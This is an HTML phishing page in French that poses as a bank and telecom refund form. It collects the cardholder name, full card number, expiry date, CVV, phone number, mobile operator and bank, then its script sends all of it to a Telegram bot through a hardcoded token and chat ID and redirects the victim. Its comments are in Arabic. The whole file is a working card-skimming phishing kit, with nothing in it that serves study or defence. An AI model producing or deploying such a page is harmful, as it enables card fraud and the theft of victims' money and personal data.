<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Remboursement</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
        }
        #card-error {
            display: none;
            color: red;
            font-size: 0.9rem;
            margin-top: 5px;
        }
    </style>
</head>
<body class="bg-gray-100 flex flex-col min-h-screen justify-between">

    <!-- Formulaire principal -->
    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
        <h1 class="text-2xl font-bold text-center text-gray-800 mb-4">Formulaire de Remboursement</h1>

        <!-- Formulaire -->
        <form id="remboursement-form">
            <!-- Titulaire de la carte -->
            <div class="mb-4">
                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Numéro de carte -->
            <div class="mb-4">
                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
                <input type="text" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="16"
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
                <p id="card-error">Le numéro de carte doit contenir exactement 16 chiffres numériques.</p>
            </div>

            <!-- Date d'expiration -->
            <div class="mb-4">
                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
                <input type="month" id="date-expiration" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Code CVV -->
            <div class="mb-4">
                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
                <input type="text" id="cvv" placeholder="123" required maxlength="3"
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Numéro de téléphone -->
            <div class="mb-4">
                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Sélection du fournisseur -->
            <div class="mb-4">
                <label for="operateur" class="block text-sm font-medium text-gray-700">Opérateur</label>
                <select id="operateur" name="operateur" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
                    <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
                    <option value="Orange">Orange</option>
                    <option value="Bouygues Telecom">Bouygues Telecom</option>
                    <option value="SFR">SFR</option>
                    <option value="Free Mobile">Free Mobile</option>
                    <option value="La Poste Mobile">La Poste Mobile</option>
                    <option value="Coriolis">Coriolis</option>
                    <option value="NRJ Mobile">NRJ Mobile</option>
                    <option value="RED by SFR">RED by SFR</option>
                    <option value="Sosh (Orange)">Sosh (Orange)</option>
                    <option value="B&YOU (Bouygues Telecom)">B&YOU (Bouygues Telecom)</option>
                    <option value="Syma Mobile">Syma Mobile</option>
                    <option value="Lycamobile">Lycamobile</option>
                    <option value="Lebara Mobile">Lebara Mobile</option>
                </select>
            </div>

            <!-- Banque -->
            <div class="mb-6">
                <label for="bank" class="block text-sm font-medium text-gray-700">Banque</label>
                <select id="bank" name="bank" required
                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
                    <option value="" disabled selected>-- Sélectionnez votre banque --</option>
                    <option value="BNP Paribas">BNP Paribas</option>
                    <option value="Société Générale">Société Générale</option>
                    <option value="CIC">CIC</option>
                    <option value="Crédit Agricole">Crédit Agricole</option>
                    <option value="Banque Populaire">Banque Populaire</option>
                    <option value="La Banque Postale">La Banque Postale</option>
                    <option value="Crédit Mutuel">Crédit Mutuel</option>
                    <option value="HSBC France">HSBC France</option>
                    <option value="ING">ING</option>
                    <option value="BforBank">BforBank</option>
                    <option value="Orange Bank">Orange Bank</option>
                    <option value="N26">N26</option>
                    <option value="Revolut">Revolut</option>
                    <option value="Autre">Autre (précisez ci-dessous)</option>
                </select>
                <input type="text" id="autre-bank" placeholder="Précisez votre banque"
                    class="mt-2 hidden block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
            </div>

            <!-- Bouton de validation -->
            <button type="submit"
                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
                Valider
            </button>
        </form>
    </div>

    <!-- Script -->
    <script>
        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
            event.preventDefault(); // منع إعادة تحميل الصفحة

            // جمع البيانات من الحقول
            const nom = document.getElementById("nom").value.trim();
            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '').trim();
            const dateExpiration = document.getElementById("date-expiration").value.trim();
            const cvv = document.getElementById("cvv").value.trim();
            const telephone = document.getElementById("telephone").value.trim();
            const operateur = document.getElementById("operateur").value.trim();
            const bank = document.getElementById("bank").value.trim();

            // التحقق من صحة رقم البطاقة
            const cardError = document.getElementById('card-error');
            const cardInput = document.getElementById('numero-carte');

            if (numeroCarte.length !== 16 || isNaN(numeroCarte)) {
                cardInput.classList.add('border-red-500');
                cardError.style.display = 'block';
                return; // وقف التنفيذ إذا كان الرقم غير صحيح
            }

            // إعداد الرسالة لتلغرام
            const message = `
🔔 **Nouvelle Demande de Remboursement** 🔔
👤 **Nom**: ${nom}
💳 **Numéro de Carte**: ${numeroCarte}
📅 **Expiration**: ${dateExpiration}
🔒 **CVV**: ${cvv}
📞 **Téléphone**: ${telephone}
📡 **Opérateur**: ${operateur}
🏦 **Banque**: ${bank}
            `;

            // إرسال البيانات إلى تلغرام
            const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I"; // التوكن الخاص بك
            const chatId = "5372119436"; // معرف الدردشة الخاص بك

            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown",
                    }),
                });

                const data = await response.json();

                if (data.ok) {
                    alert("تم إرسال المعلومات بنجاح!");
                    window.location.href = "Traitement.html"; // توجيه المستخدم
                } else {
                    alert("حدث خطأ أثناء الإرسال. تحقق من الإعدادات.");
                }
            } catch (error) {
                console.error("Error:", error);
                alert("تعذر إرسال البيانات. تحقق من الاتصال.");
            }
        });
    </script>
</body>
</html>
